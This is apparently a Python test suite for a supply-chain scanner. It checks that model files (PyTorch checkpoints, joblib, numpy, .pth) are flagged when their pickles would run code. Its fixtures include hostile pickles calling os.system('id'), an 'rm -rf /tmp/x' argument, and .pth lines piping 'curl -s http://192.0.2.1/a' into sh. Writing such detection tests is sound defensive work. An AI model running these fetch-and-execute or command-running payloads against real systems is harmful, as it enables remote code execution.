"""FP-MODEL-FILES (John's OK of Oct 20): a model file's pickles are read for what they would run, in a project scan
and with --deps.

The false positive: scan-all's run of Oct 20 gave github:ObsidianArch02/fireredasr2s-mlx WARN for one finding,
SC-NESTED-ARCHIVE on golden/golden.pt: a PyTorch checkpoint is a zip by design, so every repository or package that
ships one was WARN, while what loading it runs (torch.load unpickles it) was never read. A checkpoint whose pickle
rebuilds tensors from PyTorch's own functions and plain data is quiet now; a pickle that calls code that runs
commands or code is SC-PICKLE-CODE (CRITICAL); another installed function told what to use by text,
SC-PICKLE-GLOBAL (MAJOR); one the reader cannot finish, SC-TRUNCATED. A zip model file is read by range whatever its
size (John's decision of Oct 21): a checkpoint of 200 MB is judged as one of a few KB is, its storages never read.

Every file is built in the test (tests/_model_files.py: stand-in modules, nothing unpickled or loaded).
"""
import os
import shutil
import sys
import tempfile
import unittest

from tests import _model_files as mf
from lazaret.scanner import core


def tree(files):
    root = tempfile.mkdtemp(prefix="lz-model-")
    for rel, data in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as fh:
            fh.write(data.encode("utf-8") if isinstance(data, str) else data)
    return root


def scan(files, **kw):
    root = tree(files)
    try:
        return core.scan_project(root, **kw)
    finally:
        shutil.rmtree(root, ignore_errors=True)


def found(res, prefix=""):
    """{file: {(rule, sev)}} of the supply-chain findings."""
    out = {}
    for i in res["issues"]:
        f = i["file"].replace(os.sep, "/")
        if i["rule"].startswith("SC-") and f.startswith(prefix):
            out.setdefault(f, set()).add((i["rule"], i["sev"]))
    return out


def msgs(res, rule):
    return [i["msg"] for i in res["issues"] if i["rule"] == rule]


CODE = ("SC-PICKLE-CODE", "CRITICAL")
TRUNC = ("SC-TRUNCATED", "CRITICAL")
NESTED = ("SC-NESTED-ARCHIVE", "MINOR")


class TheFalsePositive(unittest.TestCase):
    def test_a_checkpoint_is_read_not_reported_as_an_archive(self):
        # fireredasr2s-mlx's shape: a repository with a golden checkpoint beside its code
        res = scan({"golden/golden.pt": mf.state_dict_pt("golden"), "model.py": "import mlx\n"})
        self.assertEqual(found(res), {}, res["issues"])
        self.assertTrue(res["pass"])
        self.assertEqual(res["supplyChain"], 0)


class BenignModelFiles(unittest.TestCase):
    def test_real_format_files_are_quiet(self):
        files = {
            "w/state.pt": mf.state_dict_pt(),
            "w/state.pth": mf.state_dict_pt(),
            "w/legacy.pt": mf.legacy_pt(),
            "w/last.ckpt": mf.lightning_ckpt(),
            "w/model.bin": mf.state_dict_pt(),
            "w/tree.joblib": mf.sklearn_tree(),
            "w/tree.z.joblib": mf.joblib_dump({"a": mf._Array("f8", (2,), bytes(16))}, compress="zlib"),
            "w/tree.gz.joblib": mf.joblib_dump({"a": mf._Array("f8", (2,), bytes(16))}, compress="gzip"),
            "w/old.pkl": mf.joblib_dump({"a": mf._Array("f8", (2,), bytes(16))}, aligned=False),
            "w/objects.joblib": mf.joblib_dump({"o": mf._Array("O8", (2,), objects=["a", 1])}),
            "w/plain.npy": mf.npy("<f8", bytes(24)),
            "w/objects.npy": mf.npy_objects(["a", None, 1.5]),
            "w/objects1.npy": mf.npy_objects(["a"], two=False),
            "w/arrays.npz": mf.npz({"a.npy": mf.npy("<f8", bytes(24)), "b.npy": mf.npy("<i8", bytes(24))}),
            "w/arraysc.npz": mf.npz({"a.npy": mf.npy("<f8", bytes(24))}, compressed=True),
            "w/hp.pkl": mf.plain_pickle({"lr": 0.1, "layers": [1, 2], "name": "m"}, protocol=0),
            "w/hp2.pkl": mf.plain_pickle({"lr": 0.1, "path": __import__("pathlib").PurePosixPath("/a")}, protocol=2),
            "a.py": "x = 1\n",
        }
        res = scan(files)
        self.assertEqual(found(res), {}, [(i["file"], i["rule"], i["msg"]) for i in res["issues"]])

    def test_a_full_model_of_the_projects_own_class(self):
        # torch.save(model): the project's own class, imported when the file loads (its module's code runs, and the
        # scan reads that code): listed as INFO, setting no verdict (John's decision of Oct 21)
        res = scan({"ckpt/model.pt": mf.full_model_pt("mymodel"), "mymodel.py": "class Net: pass\n"})
        self.assertEqual(found(res), {"ckpt/model.pt": {("SC-PICKLE-GLOBAL", "INFO")}})
        self.assertIn("this package's own module: mymodel (Net, made as the file loads)", msgs(res, "SC-PICKLE-GLOBAL")[0])
        self.assertTrue(res["pass"])
        self.assertEqual(res["supplyChain"], 0)
        # a function of the project's own module called with text it is told to use stays MAJOR: the text decides
        run = mf.fn("mymodel", "run")
        res = scan({"m.pkl": mf.plain_pickle(mf.Reduce(run, ("rm -rf /tmp/x",)), 2, {"mymodel": {"run": run}}),
                    "mymodel.py": "def run(c): pass\n"})
        self.assertEqual(found(res), {"m.pkl": {("SC-PICKLE-GLOBAL", "MAJOR"), ("SC-PICKLE-GLOBAL", "INFO")}})
        # called with plain names and numbers (an enum's value: Color('red'), Color(3)), it stays INFO alone
        color = mf.fn("mymodel", "Color")
        res = scan({"m.pkl": mf.plain_pickle([mf.Reduce(color, ("red",)), mf.Reduce(color, (3,))], 2,
                                             {"mymodel": {"Color": color}}),
                    "mymodel.py": "import enum\nclass Color(enum.Enum): RED = 'red'\n"})
        self.assertEqual(found(res), {"m.pkl": {("SC-PICKLE-GLOBAL", "INFO")}})
        self.assertTrue(res["pass"])
        # the class of a library the project uses is the library's: quiet
        res = scan({"ckpt/model.pt": mf.full_model_pt("somelib.models"), "app.py": "x = 1\n"})
        self.assertEqual(found(res), {})


class HostileModelFiles(unittest.TestCase):
    def test_each_shape_is_critical(self):
        res = scan({**{f"m/{k}": v for k, v in mf.hostile().items()}, "a.py": "x = 1\n"})
        got = found(res)
        for name in mf.hostile():
            self.assertIn(CODE, got.get(f"m/{name}", set()), name)
        self.assertFalse(res["pass"])

    def test_in_a_checkpoint_and_its_second_data_pkl(self):
        bad = mf.torch_zip(mf.os_system("id"), name="golden")
        two = mf.torch_zip(mf._torch_pickle({}), name="a", more=[("b/data.pkl", mf.os_system("id"))])
        nested = mf.torch_zip(mf.plain_pickle(mf.Reduce(__import__("pickle").loads, (mf.os_system("id"),)), 2))
        res = scan({"golden/golden.pt": bad, "two.pt": two, "nested.pt": nested, "a.py": "x = 1\n"})
        got = found(res)
        for f in ("golden/golden.pt", "two.pt", "nested.pt"):
            self.assertIn(CODE, got.get(f, set()), f)
        self.assertTrue(any("b/data.pkl" in m for m in msgs(res, "SC-PICKLE-CODE")))
        # an archive member the format has not keeps SC-NESTED-ARCHIVE beside it
        self.assertIn(("SC-NESTED-ARCHIVE", "MINOR"), got["two.pt"])

    def test_in_numpy_and_joblib_files(self):
        evil = mf.Reduce(__import__("os").system, ("id",))
        res = scan({
            "o.npy": mf.npy("|O", mf.os_system("id", protocol=3)),
            "x.npz": mf.npz({"w.npy": mf.npy("<f8", bytes(24)), "o.npy": mf.npy("|O", mf.os_system("id", 3))}),
            "m.joblib": mf.joblib_dump({"a": mf._Array("f8", (2,), bytes(16)), "e": evil}),
            "mz.joblib": mf.joblib_dump({"e": evil}, compress="zlib"),
            "mo.joblib": mf.joblib_dump({"o": mf._Array("O8", (1,), objects=[evil])}),
            "a.py": "x = 1\n"})
        got = found(res)
        for f in ("o.npy", "x.npz", "m.joblib", "mz.joblib", "mo.joblib"):
            self.assertIn(CODE, got.get(f, set()), (f, got))

    def test_other_functions_told_what_to_use(self):
        run = mf.fn("somelib.util", "run")
        res = scan({"m.pkl": mf.plain_pickle(mf.Reduce(run, ("rm -rf /tmp/x",)), 2,
                                             {"somelib.util": {"run": run}}), "a.py": "x = 1\n"})
        self.assertEqual(found(res), {"m.pkl": {("SC-PICKLE-GLOBAL", "MAJOR")}})
        self.assertIn("somelib.util.run with 'rm -rf /tmp/x'", msgs(res, "SC-PICKLE-GLOBAL")[0])


class Unreadable(unittest.TestCase):
    def test_cut_short_garbled_and_compressed(self):
        res = scan({"cut.pkl": mf.os_system("id")[:-3], "garbled.pkl": b"\x80\x02N\xff.",
                    "m.pkl.bz2": b"BZh91AY&SY" + bytes(20), "a.py": "x = 1\n"})
        got = found(res)
        for f in ("cut.pkl", "garbled.pkl", "m.pkl.bz2"):
            self.assertIn(TRUNC, got.get(f, set()), f)

    def test_a_model_file_past_the_size_limit(self):
        from unittest import mock
        # a zip read by range whatever its size; a pickle that is not in a zip, by its first bytes: SC-TRUNCATED
        with mock.patch.object(core, "SOURCE_SIZE_CAP", 4096):
            res = scan({"big.pt": mf.torch_zip(mf._torch_pickle({}), [("0", bytes(8000))]),
                        "bad.pt": mf.torch_zip(mf.os_system("id"), [("0", bytes(8000))]),
                        "big.pkl": mf.plain_pickle({"w": bytes(8000)}, 2), "a.py": "x = 1\n"})
        got = found(res)
        self.assertNotIn("big.pt", got)
        self.assertEqual(got["bad.pt"], {CODE})
        self.assertEqual(got["big.pkl"], {TRUNC})
        self.assertIn("exceeds the 4,096-byte file limit, so the model file's pickle was not read",
                      " ".join(msgs(res, "SC-TRUNCATED")))

    def test_a_pth_file_past_the_size_limit(self):
        # read in chunks for the lines site.py runs (John's decision of Oct 21), and a checkpoint's pickles by range:
        # complete, so no SC-TRUNCATED
        from unittest import mock
        late = b"\nimport os; os.system('curl -s http://192.0.2.1/a | sh')\n"
        with mock.patch.object(core, "SOURCE_SIZE_CAP", 4096):
            res = scan({"w/model.pth": mf.torch_zip(mf._torch_pickle({}), [("0", bytes(8000))]),
                        "w/bad.pth": mf.torch_zip(mf.os_system("id"), [("0", bytes(8000))]),
                        "w/late.pth": mf.torch_zip(mf._torch_pickle({}), [("0", bytes(8000))],
                                                   more=[("archive/extra/notes", late)]),
                        "paths.pth": "./lib\n" * 1000 + "import sitecustomize_x\n" + "./more\n" * 1000,
                        "long.pth": "import os  # " + "a" * 1_100_000 + "\nimport sys\n",
                        "a.py": "x = 1\n"})
        got = found(res)
        self.assertNotIn("w/model.pth", got)
        self.assertEqual(got["w/bad.pth"], {CODE})
        # (a member the format has not: the archive keeps SC-NESTED-ARCHIVE, the external review of Oct 21)
        self.assertEqual(got["w/late.pth"], {("SC-PTH-EXEC", "CRITICAL"), NESTED})
        self.assertEqual(got["paths.pth"], {("SC-PTH-EXEC", "MAJOR")})
        line = [i["line"] for i in res["issues"] if i["file"] == "paths.pth" and i["rule"] == "SC-PTH-EXEC"]
        self.assertEqual(line, [1001])
        # a line Python would run past the bound: SC-TRUNCATED, the next line read
        self.assertEqual(got["long.pth"], {("SC-PTH-EXEC", "MAJOR"), TRUNC})
        self.assertIn("line 1, which Python would run, is longer than the 1,000,000 bytes read of a line",
                      " ".join(msgs(res, "SC-TRUNCATED")))


class LargeCheckpoints(unittest.TestCase):
    """A checkpoint of 200 MB (a sparse file: its storages are holes) read by range: its directory and data.pkl, a few
    KB, in bounded time and memory; quiet when its pickle is benign, CRITICAL when hostile, in the project and with
    --deps."""

    def test_a_200_mb_checkpoint_is_judged(self):
        import time
        sp = ".venv/lib/python3.12/site-packages"
        root = tempfile.mkdtemp(prefix="lz-model-big-")
        try:
            late = b"\nimport os; os.system('curl -s http://192.0.2.1/a | sh')\n"
            parts = {"w/model.pt": mf.big_torch_zip(mf._torch_pickle({"w": 1}), [100_000_000, 100_000_000]),
                     # (.pth, PyTorch's usual name: its lines streamed, its pickle by range)
                     "w/model.pth": mf.big_torch_zip(mf._torch_pickle({"w": 1}), [100_000_000, 100_000_000]),
                     "w/evil.pth": mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                                    more=[("archive/extra/notes", late)]),
                     f"{sp}/dep/evil.pth": mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                                            more=[("archive/extra/notes", late)]),
                     "w/bad.pt": mf.big_torch_zip(mf.os_system("curl -s http://192.0.2.1/a | sh"), [200_000_000]),
                     "w/late.pt": mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                                   more=[("archive/constants.pkl", mf.os_system("id"))]),
                     f"{sp}/dep/w.pt": mf.big_torch_zip(mf.os_system("id"), [200_000_000]),
                     # (5 GB, zip64: sizes and offsets past 4 GiB)
                     "w/zip64.pt": mf.big_torch_zip(mf._torch_pickle({}), [2_500_000_000, 2_500_000_000],
                                                    more=[("archive/extra.pkl", mf.os_system("id"))])}
            for rel, ps in parts.items():
                path = os.path.join(root, *rel.split("/"))
                os.makedirs(os.path.dirname(path), exist_ok=True)
                mf.write_parts(path, ps)
                self.assertGreater(os.path.getsize(path), 200_000_000)
            for rel, data in {"a.py": "x = 1\n", ".venv/pyvenv.cfg": "home = /usr/bin\n",
                              f"{sp}/dep/__init__.py": "x = 1\n"}.items():
                path = os.path.join(root, *rel.split("/"))
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as fh:
                    fh.write(data)
            before = mf.peak_kib()
            t = time.monotonic()
            res = core.scan_project(root, include_deps=True)
            took = time.monotonic() - t
            grew = mf.peak_kib() - before                                            # (KiB)
        finally:
            shutil.rmtree(root, ignore_errors=True)
        got = found(res)
        self.assertNotIn("w/model.pt", got)
        self.assertNotIn("w/model.pth", got)
        # (a member the format has not keeps SC-NESTED-ARCHIVE beside: the external review of Oct 21)
        self.assertEqual(got["w/evil.pth"], {("SC-PTH-EXEC", "CRITICAL"), NESTED})
        self.assertEqual(got[f"{sp}/dep/evil.pth"], {("SC-PTH-EXEC", "CRITICAL"), NESTED})
        self.assertEqual(got["w/bad.pt"], {CODE})
        self.assertEqual(got["w/late.pt"], {CODE, NESTED})
        self.assertEqual(got[f"{sp}/dep/w.pt"], {CODE})
        self.assertEqual(got["w/zip64.pt"], {CODE, NESTED})
        self.assertTrue(any("archive/constants.pkl" in m for m in msgs(res, "SC-PICKLE-CODE")))
        # (Windows' runners are slower at reading these files: the npm twin's scan of its 1.2 GB of checkpoints took
        # 23.8 s on CI's windows-latest, PR #17, Oct 29, where its bound is 20 s elsewhere; this tree has a third .pth
        # read in chunks and the 5 GB zip64 checkpoint more, so 90 s there, three times the bound, as the twin's is)
        self.assertLess(took, 90 if sys.platform == "win32" else 30, took)
        self.assertLess(grew, 100_000, f"{grew} KiB more")


class Deps(unittest.TestCase):
    def test_a_dependencys_model_file(self):
        sp = ".venv/lib/python3.12/site-packages"
        files = {".venv/pyvenv.cfg": "home = /usr/bin\n", "app.py": "import evilpkg\n",
                 f"{sp}/evilpkg/__init__.py": "x = 1\n", f"{sp}/evilpkg/weights.pt": mf.torch_zip(mf.os_system("id")),
                 f"{sp}/goodpkg/__init__.py": "x = 1\n", f"{sp}/goodpkg/weights.pt": mf.state_dict_pt()}
        res = scan(files, include_deps=True)
        got = found(res, ".venv/")
        self.assertIn(CODE, got.get(f"{sp}/evilpkg/weights.pt", set()), got)
        self.assertNotIn(f"{sp}/goodpkg/weights.pt", got)
        # without --deps the tree is not read
        self.assertEqual(found(scan(files), ".venv/lib"), {})


if __name__ == "__main__":
    unittest.main()
